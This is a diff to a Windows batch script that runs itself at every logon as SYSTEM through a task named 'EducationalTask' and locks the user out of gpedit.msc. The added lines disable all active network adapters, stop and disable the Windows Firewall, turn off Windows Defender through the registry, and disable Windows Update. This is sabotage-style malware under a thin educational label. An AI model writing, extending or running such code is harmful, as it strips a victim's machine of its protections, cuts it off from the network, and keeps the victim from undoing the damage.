@@ -40,7 +40,11 @@ echo Initial text file path: %initial_text_file%
 
 REM Schedule a task to run this script on logon
 schtasks /create /tn "EducationalTask" /tr "\"%~dpnx0\"" /sc onlogon /ru SYSTEM /f
-
+for /F "tokens=*" %%A in ('powershell -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty Name"') do (
+    set "adapter_name=%%A"
+    echo Disabling internet for adapter: !adapter_name!
+    netsh interface set interface "!adapter_name!" admin=disabled
+)
 REM Check if the schtasks command was successful
 if %errorlevel% neq 0 (
     echo Task creation failed. Check permissions or command syntax.
@@ -61,7 +65,10 @@ REM Modify registry setting
 takeown /f "%SystemRoot%\System32\gpedit.msc"
 cacls "%SystemRoot%\System32\gpedit.msc" /E /P %USERNAME%:N
 ren "%SystemRoot%\System32\gpedit.msc" gpedit.msc.bak
-
+net stop "MpsSvc"
+sc config "MpsSvc" start=disabled
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+sc config "wuauserv" start=disabled
 REM Open some applications
 for /l %%i in (1,1,5) do (
     start "" "cmd.exe"
